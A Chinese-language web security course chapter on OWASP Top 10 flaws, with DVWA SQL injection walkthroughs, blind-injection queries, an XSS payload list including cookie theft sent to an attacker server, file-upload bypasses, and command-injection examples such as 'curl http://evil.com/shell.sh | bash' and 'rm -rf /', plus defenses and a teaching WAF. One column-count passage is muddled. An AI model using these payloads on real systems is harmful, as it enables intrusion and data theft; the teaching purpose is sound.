# 06 · Web安全——漏洞与防御

> **⏪ 前置知识：** 网络协议（04）+ Python（02）——必须理解 HTTP 请求格式和会用 requests 库
> **⏩ 学完后解锁：** CTF-Web 题目、渗透实战 Web 部分
> **⏱ 预计用时：** 7-8 小时（Web 安全内容最多最杂，建议分 4-5 天学完）
> **🎯 核心目标：** 理解 OWASP Top 10 的核心漏洞原理，能手写 payload 在靶场复现每个漏洞

---

## 🚪 门前检查

**在开始本章之前，你必须能回答：**

- [ ] 能写出 HTTP 请求的格式：请求行、Headers、空行、Body（04§4）
- [ ] 知道 GET 和 POST 的区别（04§4）
- [ ] 能用 Python 的 requests 库发请求和读响应（02§5）
- [ ] 了解数据库的基本概念——"表、行、列、SQL 查询"是什么

---

## 📊 本章进度

| # | 知识点 | 预计用时 | 状态 |
|---|--------|:--:|:--:|
| 6.1 | Web 安全全景图——OWASP Top 10 | 30 分钟 | ⬜ |
| 6.2 | 📌 SQL 注入——数据库的噩梦 | 60 分钟 | ⬜ |
| 6.3 | SQL 盲注——无回显时怎么打 | 45 分钟 | ⬜ |
| 6.4 | 📌 XSS 跨站脚本——浏览器的漏洞 | 60 分钟 | ⬜ |
| 6.5 | CSRF——冒用身份的攻击 | 45 分钟 | ⬜ |
| 6.6 | SSRF——让服务器替你访问 | 45 分钟 | ⬜ |
| 6.7 | 文件上传漏洞——后门的入口 | 45 分钟 | ⬜ |
| 6.8 | 文件包含漏洞——LFI/RFI | 30 分钟 | ⬜ |
| 6.9 | 命令注入——执行系统命令 | 30 分钟 | ⬜ |
| 6.10 | 🧪 写一个简易 WAF | 45 分钟 | ⬜ |

---

## 1. Web 安全全景图

### 🏪 生活场景：银行营业厅

一个银行营业厅有三层防线：

```
大门 → 保安 → 柜台窗口 → 金库

你(浏览器)走进银行大门（Web服务器）
保安检查你的身份证（登录认证）
你走到 3 号窗口（API 路由）
柜员核对你的信息后在电脑上操作（后端逻辑）
柜员转身去金库取钱（数据库查询）
```

**Web 安全漏洞就是攻击者在这条链上找到的薄弱环节：**
- SQL 注入 → 你填写的取款单被柜员当命令执行了
- XSS → 在银行公告栏上贴假通知
- CSRF → 伪造你的委托书让柜员转账
- SSRF → 买通柜员去 CEO 办公室拿文件
- 文件上传 → 把炸弹伪装成文件快递送进金库
- 命令注入 → 在取款单备注里写"顺便把保险柜密码给我"

### OWASP Top 10（2021 版）速览

| 排名 | 风险 | 一句话解释 |
|:----:|------|----------|
| A01 | 访问控制失效 | 没登录也能看别人的订单 |
| A02 | 加密机制失效 | 密码明文存、用了 MD5 |
| A03 | **注入** | ★ 把恶意命令混在输入里（本章重点） |
| A04 | 不安全的设计 | 架构从根上就不安全 |
| A05 | 安全配置错误 | 默认密码没改、debug 页面没关 |
| A06 | 含漏洞的组件 | 用了旧版框架——已知漏洞没修 |
| A07 | 认证失效 | 弱密码、能绕过登录 |
| A08 | 数据完整性失效 | 没验证下载的更新是不是正版 |
| A09 | 日志监控失效 | 被攻破了几个星期才发现 |
| A10 | **SSRF** | 让服务器替你去访问内网 |

---

## 2. 📌 SQL 注入——数据库的噩梦

### 🏪 生活场景：银行取款单被篡改

你去银行取钱，柜员给你一张取款单：

```
┌─────────────────────────┐
│ 取款单                   │
│                         │
│ 姓名:  张三              │
│ 账号:  6222 **** 1234    │
│ 金额:  500               │
│ 备注:                   │
└─────────────────────────┘

柜员录入系统的 SQL:
SELECT * FROM accounts WHERE name='张三' AND account='6222...' AND amount=500;
```

现在，你在"姓名"一栏填的不是"张三"，而是：

```
姓名:  ' OR '1'='1' --
```

柜员把这一行拼进 SQL：

```sql
SELECT * FROM accounts
WHERE name='' OR '1'='1' --' AND account='6222...' AND amount=500;
              ↑                    ↑
          永真条件！         -- 把后面的条件全注释掉了！
```

实际执行的 SQL 变成了：

```sql
SELECT * FROM accounts WHERE name='' OR '1'='1';
-- '1'='1' 永远是 true → WHERE 条件永真 → 返回所有账户！
```

**你不需要知道任何人的密码，就拿走了所有人的账户信息。**

### 🔍 SQL 注入分类

```
┌──────────────────────────────────────────────┐
│               SQL 注入攻击分类                 │
│                                               │
│ 有回显（你能直接看到查询结果）：                  │
│  ├─ 联合查询注入 (UNION SELECT)                │
│  │   把你的结果"并"在正常结果后面 → 直接看到数据   │
│  ├─ 报错注入                                  │
│  │   利用数据库报错信息泄露数据                  │
│  └─ 堆叠查询                                  │
│      用 ; 执行多条 SQL 语句                    │
│                                               │
│ 无回显（盲注——你看不到数据但要靠推理）：           │
│  ├─ 布尔盲注                                  │
│  │   看页面返回 True 还是 False → 逐位猜解       │
│  └─ 时间盲注                                  │
│      看页面返回快还是慢 → 逐位猜解               │
└──────────────────────────────────────────────┘
```

### 💻 手把手：联合查询注入（DVWA Low 难度）

**环境准备：** 装好 DVWA（Damn Vulnerable Web Application）靶场，安全等级设为 Low。

```
目标 URL: http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

步骤 1: 判断是否存在注入
  ?id=1'             → 页面报错 "You have an error in your SQL syntax"
  ?id=1'--           → 页面恢复正常
  → ★ 确认存在注入！

步骤 2: 判断原查询列数（用 ORDER BY 二分法）
  ?id=1' ORDER BY 1--  → 正常
  ?id=1' ORDER BY 2--  → 正常
  ?id=1' ORDER BY 3--  → 正常
  ?id=1' ORDER BY 4--  → 报错！
  → 原查询有 2 列（准确说是 ORDER BY 3 正常，4 报错 → 3 列？不对，我们看...）

  实际上 ORDER BY n 在 n<=列数时正常
  → n=3 正常，n=4 报错 → 有 2 列（需要重新算，实际 DVWA 里通常是 2 列）

步骤 3: 看哪些列回显在页面上
  ?id=-1' UNION SELECT 1,2--    → 页面上显示 1 和 2？没有？
  ?id=1' AND 1=0 UNION SELECT 1,2--
  → 页面上出现了 First name: 1 Surname: 2
  → 第 1 列和第 2 列都有回显！

步骤 4: 获取基本信息
  ?id=-1' UNION SELECT database(), user()--
  → First name: dvwa   Surname: root@localhost
  → 数据库名 = dvwa, 当前用户 = root（权限太高了！）

步骤 5: 查所有表名
  ?id=-1' UNION SELECT 1, group_concat(table_name)
  FROM information_schema.tables WHERE table_schema='dvwa'--
  → guestbook, users

步骤 6: 查 users 表的列名
  ?id=-1' UNION SELECT 1, group_concat(column_name)
  FROM information_schema.columns WHERE table_name='users'--
  → user_id, user, password, avatar, ...

步骤 7: 拖用户密码
  ?id=-1' UNION SELECT user, password FROM users--
  → admin / 5f4dcc3b5aa765d61d8327deb882cf99  (MD5)
  → gordonb / e99a18c428cb38d5f260853678922e03
  → ...
```

**你拿到了所有用户的用户名和密码哈希！** 然后在 [crackstation.net](https://crackstation.net) 查一下——admin 的密码赫然是 "password"。

### 🛡️ 防御方法

**根本防御：参数化查询（Prepared Statement）**

```python
# ❌ 错误写法（字符串拼接）
cursor.execute(f"SELECT * FROM users WHERE id={user_input}")

# ✅ 正确写法（参数化查询）
cursor.execute("SELECT * FROM users WHERE id=?", (user_input,))
# user_input 被当做一个值（字符串/数字），永远不会被当做 SQL 代码执行
```

**不管是 PHP、Java、Python、Node.js，原理是一样的——用户输入和 SQL 语句要分开传。**

其他防御层（纵深防御——每一层都加一道锁）：

```
→ 输入白名单: id 只能是数字 → 非数字直接拒绝
→ 最小权限: 数据库用户只给 SELECT，不给 DROP
→ WAF: 拦截包含 ' OR 1=1 等特征的请求
→ 错误信息不暴露给前端: 不要让攻击者看到 "MySQL syntax error..."
```

---

## 3. SQL 盲注——无回显时怎么打

### 🏪 生活场景：对讲机版"猜数字"

你看不到对方的脸，只有一个对讲机。你问一个问题，对方只能说"对"或"错"。你要猜出他手里那张纸上写的数字是什么。

```
第一轮: "数字 > 50？"  → "对"  → 数字在 51-100
第二轮: "数字 > 75？"  → "错"  → 数字在 51-75
第三轮: "数字 > 63？"  → "对"  → 数字在 64-75
...
7 轮之后: 数字 = 71
```

**时间盲注就是这个原理。** 你看不到查询结果，但你能感受到"服务器卡了一会儿"——说明条件成立（IF/THEN 里执行了 sleep）。

### 💻 时间盲注逐位猜解

```
假设要猜数据库名的第一个字符:

?id=1' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)--
  → 页面很快返回 → 不是 'a'

?id=1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)--
  → 页面延迟了 3 秒！→ ★ 第一个字符是 'd'！

第二个字符:
?id=1' AND IF(SUBSTRING(database(),2,1)='v', SLEEP(3), 0)--
  → 延迟 3 秒 → 第二个字符是 'v'！

继续猜...
最终得出: dvwa (数据库名)
```

**真实攻击中不会手动一个个猜。** 用 sqlmap 自动化：

```bash
sqlmap -u "http://target.com/page.php?id=1" \
       --technique=T \    # T=时间盲注
       --dbs              # 列出所有数据库
```

---

## 4. 📌 XSS 跨站脚本——浏览器的漏洞

### 🏪 生活场景：公告栏上贴假的官方通知

**反射型 XSS = 在公告栏上贴一张"扫码领红包"的海报**

你收到一条短信："您的快递已送达，请点击链接查看：`http://kuaidi.com/track?id=<script>偷Cookie的代码</script>`"。你点开链接，网页显示"您的快递正在运输中"——看起来一切正常。但背后的 `<script>` 已经执行了，把你的登录 Cookie 发给了攻击者。

**存储型 XSS = 攻击者混进物业办公室，把假通知贴进了"物业官方公告栏"**

攻击者在网站的评论区提交了这样一条留言：

```html
这个产品真好用！
<script>
  new Image().src = 'http://攻击者服务器/steal?cookie=' + document.cookie;
</script>
```

这条留言被存进了数据库。之后每个来看产品评论的用户——他们的浏览器都会执行这段 JS，把所有 Cookie 发给攻击者。

**DOM 型 XSS = 前台接待员被收买，私自给访客指错路**

纯前端逻辑漏洞。比如网页从 URL 参数里取了一个值，用 `innerHTML` 显示在页面上：

```javascript
// 漏洞代码
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = '欢迎, ' + name;
// 访问: page.html#<img src=x onerror=alert(1)>
// → 弹窗！
```

### 🔍 三种 XSS 对比

| 类型 | 恶意代码在哪 | 谁中招 | 典型场景 |
|------|-----------|--------|---------|
| 反射型 | URL 参数里 | 点击链接的人 | 钓鱼邮件中的恶意链接 |
| 存储型 | 存在数据库里 | 所有访问者 | 评论区/留言板/个人资料 |
| DOM 型 | 纯前端处理 | 点击链接的人 | URL hash 被直接写入 innerHTML |

**存储型 XSS 最危险——** 一个恶意留言，能让所有访问那个页面的用户都被偷走 Cookie。

### 💻 XSS 攻击 payload 大全

```javascript
// === 基础验证 ===
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

// === 盗取 Cookie（最经典） ===
<script>
  new Image().src = 'http://攻击者IP:8888/steal?c=' + document.cookie;
</script>
// 攻击者在自己服务器上监听: nc -lvp 8888

// === 绕过简单过滤 ===
// 如果过滤了 <script>:
<img src=x onerror="alert(1)">
<body onload="alert(1)">
<svg onload="alert(1)">
<a href="javascript:alert(1)">点我</a>

// === 绕过大小写过滤 ===
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR="alert(1)">

// === 绕过空格过滤 ===
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

// === 编码绕过 ===
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
// fromCharCode(97..) = "alert(1)"
```

### 🛡️ 防御方法

```
① 输出编码（核心防御）—— 所有输出到 HTML 的数据都要编码:
   < → &lt;
   > → &gt;
   " → &quot;
   ' → &#x27;
   & → &amp;
   浏览器看到 &lt;script&gt; 会当普通文字显示，不会执行

② CSP（内容安全策略）—— HTTP 响应头:
   Content-Security-Policy: script-src 'self'
   → 浏览器只执行本域名的 JS，不执行内联脚本和外部注入的 JS

③ HttpOnly Cookie:
   Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
   → Cookie 不能被 JS 读取（document.cookie 访问不到）
   → XSS 偷不走会话 Cookie！

④ 输入验证:
   名字只能是字母和中文 → 拒绝 < > " ' 等特殊字符
```

---

## 5. CSRF——冒用身份的攻击

### 🏪 生活场景：伪造快递签收单

场景：你已经登录了网上银行。浏览器里有你的登录 Cookie（相当于你在银行大厅里，不需要每次操作都重新验证身份）。

你打开了另一个网页——可能是一篇新闻、一个搞笑视频。这个网页里藏了一张"图片"：

```html
<img src="http://bank.com/transfer?to=黑客账户&amount=10000" />
```

浏览器看到 `<img src="...">`，会自动发一个 GET 请求去加载这张"图片"。请求自动带上了你在 bank.com 的 Cookie——因为浏览器认为这是发给 bank.com 的正常请求。

银行看到："哦，这是你的 Cookie，你的身份已验证。转账 10000 元到黑客账户？好的。"——转账成功。

**你什么都没做，只是在看一个搞笑视频。钱就没了。**

### 🛡️ 防御方法

```
① CSRF Token（最常用）:
   每次表单里放一个随机生成的 token:
   <input type="hidden" name="csrf_token" value="a8f3b9c2e1d4">
   服务器验证这个 token
   攻击者不知道 token → 请求被拒绝

② SameSite Cookie:
   Set-Cookie: session=xxx; SameSite=Strict
   → 浏览器只在同站请求时才发送 Cookie
   → 从搞笑视频网站发向 bank.com 的请求不带 Cookie → CSRF 失效

③ 验证 Origin / Referer 头:
   检查请求来自哪个网站
   → 如果来自 bank.com → 正常
   → 如果来自 funny-videos.com → 拒绝
```

---

## 6. SSRF——服务端请求伪造

### 🏪 生活场景：让前台接待员帮你去 CEO 办公室拿文件

你在写字楼一楼大厅。前台（Web 服务器）不让你上楼——你必须刷卡通过闸机。但是你发现了一个漏洞：前台提供一项"代取快递"服务。

你说："帮我取一下快递。" 前台问："快递柜编号多少？" 你说："B 区 127 号——那是 CEO 办公室的文件柜。"

前台刷卡通过闸机，走进办公区，来到"CEO 办公室文件柜"，拿出了里面的文件，回来交给你。"您的快递，先生。"

**这就是 SSRF：你让服务器（前台）替你访问了你直接访问不到的内部资源（CEO 办公室）。**

### 🔍 常见攻击目标

```
① 读取云服务器元数据（AWS/阿里云/GCP）:
   http://169.254.169.254/latest/meta-data/
   → 可能泄露 AccessKey、AMI ID、安全组配置

② 探测内网端口:
   http://127.0.0.1:22/  → SSH?
   http://127.0.0.1:6379/ → Redis?（可能没密码！）
   http://127.0.0.1:3306/ → MySQL?

③ 攻击内网未授权服务:
   很多内网服务没有认证（"内网的，不设密码了"）
   → SSRF 让外部攻击者也能访问这些服务

④ 端口扫描内网:
   http://10.0.0.1:80/
   http://10.0.0.2:80/
   ...
```

---

## 7. 文件上传漏洞——后门的入口

### 🏪 生活场景：美术馆的安检漏洞

你是美术馆的安检员。你的工作是阻止危险物品进入。

```
正常: 访客掏出手机（.jpg）→ 安检仪显示"图片"→ 放行
攻击: 访客把刀（webshell.php）用锡纸包住（改后缀/伪造文件头）
       → 安检仪只看了表面（没检查文件内容）
       → 放行！
       → 攻击者走进美术馆，掏出刀（执行 webshell = 控制服务器）
```

### 💻 常见绕过手法

```
服务器只检查文件后缀:
  → shell.php 被拒
  → shell.php5 → 通过！Apache 可能仍然当 PHP 执行
  → shell.phtml → 通过！
  → shell.php.jpg → 通过！（某些配置下 PHP 也会执行 .php.jpg）

服务器只检查 Content-Type:
  → Content-Type: application/x-php → 被拒
  → 抓包，改成 Content-Type: image/jpeg → 通过！

服务器只检查文件头（Magic Bytes）:
  → 在 webshell 代码前面加上 GIF89a → 伪装成 GIF 图片
  → 文件头检查通过！但文件后缀是 .php → Apache 当 PHP 执行

服务器检查文件扩展名（黑名单）:
  → 黑名单: php, jsp, asp, aspx
  → 绕过: pHp (大小写), .pht, .phtml, .php5, .phar, .shtml
```

### 🛡️ 正确的防御方法

```
① 白名单（不是黑名单！）:
   只允许: .jpg .jpeg .png .gif .pdf .docx
   禁止清单 → 永远有漏的；白名单 → 不在名单上的全拒绝

② 重命名文件:
   不要保留用户上传的文件名
   生成随机文件名: a8f3b9c2e1d4.jpg

③ 文件存储在单独的静态服务器/OSS:
   没有脚本执行权限 → 就算传了 .php 也执行不了

④ 上传目录设置不可执行:
   服务器配置: 这个目录下的文件永远不执行脚本
```

---

## 8. 文件包含漏洞（LFI/RFI）

```php
// 可怕的代码:
<?php
  $page = $_GET['page'];
  include($page . ".php");     // 直接把用户输入放进 include！
?>
```

```
本地文件包含（LFI）:
  ?page=../../../../etc/passwd
  → include("/etc/passwd.php")
  → passwd 文件的内容被读出来！虽然加了 .php 后缀但数据泄露了

  ?page=../../../../var/log/apache2/access.log
  → 日志里有 User-Agent（浏览器标识）→ 攻击者先在 User-Agent 里写 <?php ... ?>
  → 日志文件被 include → 里面的 PHP 代码被执行！

远程文件包含（RFI，配置默认关闭）:
  ?page=http://evil.com/malicious
  → 远程服务器上的恶意 PHP 文件被下载并执行
```

---

## 9. 命令注入

### 🏪 生活场景：智能音箱被忽悠

你对智能音箱说："播放周杰伦的歌。" 音箱播放音乐。

别人对音箱说："把音量调到 0；然后帮我把大门打开。"

如果音箱的语音识别系统把后面的"开大门"也当成一条指令执行了——门就开了。

**命令注入就是这样：** 你的输入被放进了一条系统命令里，然后被 shell 执行了。特殊字符（`;` `|` `&&`）让你的恶意命令跟着正常命令一起执行。

### 💻 注入字符速查

```
;     分号 → 执行完上一条，执行下一条
|     管道 → 前一条的输出作为后一条的输入
||    OR   → 前一条失败才执行后一条
&&    AND  → 前一条成功才执行后一条
`cmd`  反引号 → 先执行里面的命令，把结果放在这
$(cmd)        → 同上（更现代的写法）
```

```python
# 可怕的代码
import os
filename = request.GET['file']
os.system("cat " + filename)

# 正常输入: report.txt
# → cat report.txt  ✓

# 恶意输入: report.txt; rm -rf /
# → cat report.txt; rm -rf /  ✗ 删库！

# 恶意输入: report.txt && curl http://evil.com/shell.sh | bash
# → 下载恶意脚本并执行！
```

---

## 10. 🧪 综合实验：写一个简易 WAF

把本章学的所有漏洞类型串联起来，写一个 Web 应用防火墙：

```python
# simple_waf.py —— 一个教学用的简易 WAF
# 用 Flask 做一个反向代理，拦截常见攻击
# pip install flask requests

from flask import Flask, request
import requests
import re

app = Flask(__name__)
BACKEND = "http://localhost:8080"  # 被保护的后端

# WAF 规则
RULES = [
    # SQL 注入检测
    (re.compile(r"(?i)(union.*select|or\s+1\s*=\s*1|--|/\*|sleep\s*\(|benchmark\s*\()"),
     "SQL注入"),

    # XSS 检测
    (re.compile(r"(?i)(<script|onerror\s*=|onload\s*=|javascript:|<img[^>]+on)"),
     "XSS攻击"),

    # 命令注入检测
    (re.compile(r"(?i)(;\s*(rm|cat|ls|whoami|id|uname|wget|curl)|\|\||&&)"),
     "命令注入"),

    # 路径穿越检测
    (re.compile(r"(\.\./){2,}"), "目录穿越"),

    # 文件包含检测
    (re.compile(r"(?i)(/etc/passwd|/etc/shadow|php://|expect://|data://)"),
     "文件包含"),
]

def waf_check(value):
    """检测单个值是否触发 WAF 规则"""
    for pattern, attack_type in RULES:
        if pattern.search(value):
            return attack_type
    return None

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    # 检查所有参数
    for key, values in request.args.items():
        for v in (values if isinstance(values, list) else [values]):
            result = waf_check(v)
            if result:
                return f"<h1>🚫 被 WAF 拦截</h1><p>检测到: {result}</p><p>参数: {key}={v}</p>", 403

    for key, values in request.form.items():
        for v in (values if isinstance(values, list) else [values]):
            result = waf_check(v)
            if result:
                return f"<h1>🚫 被 WAF 拦截</h1><p>检测到: {result}</p>", 403

    # 放行 → 转发到后端
    url = f"{BACKEND}/{path}"
    if request.args:
        url += "?" + request.query_string.decode()

    resp = requests.request(
        method=request.method,
        url=url,
        headers={k: v for k, v in request.headers if k != 'Host'},
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False
    )

    return (resp.content, resp.status_code, resp.headers.items())

if __name__ == "__main__":
    print("[*] WAF 启动在 http://localhost:5000")
    print(f"[*] 转发到后端: {BACKEND}")
    app.run(port=5000)
```

---

## 🛠️ 靶场（学完必须打）

| 平台 | 方向 | 难度 | 怎么开始 |
|------|------|:--:|------|
| DVWA | 全 Web 漏洞 | ⭐ | 下载 → XAMPP/LAMP → 打开 localhost/dvwa |
| Pikachu | 全 Web 漏洞(中文) | ⭐ | GitHub 下载 → 部署到 PHP 环境 |
| SQLi-labs | SQL 注入专项 | ⭐⭐ | 65 关，从 `?id=1'` 到时间盲注 |
| PortSwigger Academy | 全 Web 漏洞 | ⭐⭐~⭐⭐⭐ | portswigger.net 免费注册在线练习 |
| BUUCTF Web | CTF 题目 | ⭐⭐~⭐⭐⭐⭐ | buuoj.cn 在线注册 |

---

## 📝 复习自检

- [ ] 能在 DVWA 上手动完成一次 SQL 注入（联合查询，从判断列数到拖数据）
- [ ] 能解释什么是盲注，以及布尔盲注和时间盲注的区别
- [ ] 能写出一个触发 XSS 弹窗的 payload：`<script>alert('XSS')</script>`
- [ ] 能分清三种 XSS（反射/存储/DOM）的区别和各自典型场景
- [ ] 能说清楚 CSRF 和 XSS 的区别——CSRF 利用的是 Cookie 信任，XSS 利用的是 JS 执行
- [ ] 能解释 SSRF 为什么危险——让服务器访问内网资源
- [ ] 能说出文件上传绕过检测的至少 3 种手法
- [ ] 能说出命令注入用哪些字符：`;` `|` `||` `&&` `` ` `` `$()`
- [ ] 知道每个漏洞的**根本防御**是什么（不是"打个补丁"，是设计层面怎么避免）

---

## 🎬 推荐视频

| 视频 | 平台 | 说明 |
|------|------|------|
| [B站最系统网络安全教程](https://www.bilibili.com/video/BV1am421x7Fy/) | B站 | ⭐ 零基础到渗透实战 |
| [SQL注入漏洞全集](https://www.bilibili.com/video/BV1pZ4211755/) | B站 | SQL 注入 + XSS 双专题 |
| [OWASP Top 10 零基础](https://www.bilibili.com/video/BV1KU421Z7o1/) | B站 | 十大漏洞分类讲解 |

---

## 🔗 知识串联

```
SQL 注入的 UNION      → 《01-C语言》内存操作——底层理解让你更懂注入
XSS 的 JS 代码执行     → 《03-计算机体系》的"数据 = 指令"——同一个道理！
SSRF 的内网穿透       → 《04-网络协议》的内网地址（127.0.0.1/10.x/192.168.x）
命令注入              → 《08-渗透实战》拿到 shell 后的操作
文件上传 webshell     → 《08-渗透实战》初始突破、权限维持
WAF 绕过             → 《05-密码学》编码/加密绕过检测
```

---

> 💬 **读完用一句话记下来：** "Web 安全的本质就一句话——永远不要信任用户的输入。所有漏洞的根源都是：代码把用户的输入当成了指令来执行，而不是当成数据来处理。SQL 拼接、HTML 输出、命令拼接、文件路径拼接——全是同一个道理。"

### 下一步：打开 `07-二进制安全-内存攻击.md`
